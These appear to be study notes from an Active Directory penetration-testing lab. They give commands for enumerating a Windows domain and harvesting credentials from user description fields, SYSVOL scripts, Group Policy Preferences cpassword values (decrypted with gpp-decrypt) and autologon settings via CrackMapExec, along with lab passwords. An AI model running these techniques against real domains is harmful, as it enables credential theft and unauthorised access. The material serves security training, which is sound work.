
#### Enumerating for MS-PRN Printer Bug

```ruby
Import-Module .\SecurityAssessment.ps1
```

```ruby
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```


## Enumerating DNS Records

```ruby
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

```ruby
head records.csv 
```

#### Finding Passwords in the Description Field using Get-Domain User

```ruby
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```


#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```ruby
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```


#### Discovering an Interesting Script

```ruby
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

```ruby
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the `--local-auth` flag as shown in this module's `Internal Password Spraying - from Linux` section.


## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

it calls Groups.xml .


If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

#### Decrypting the Password with gpp-decrypt

```ruby
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose.


## Using CrackMapExec's gpp_autologin Module

```ruby
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```


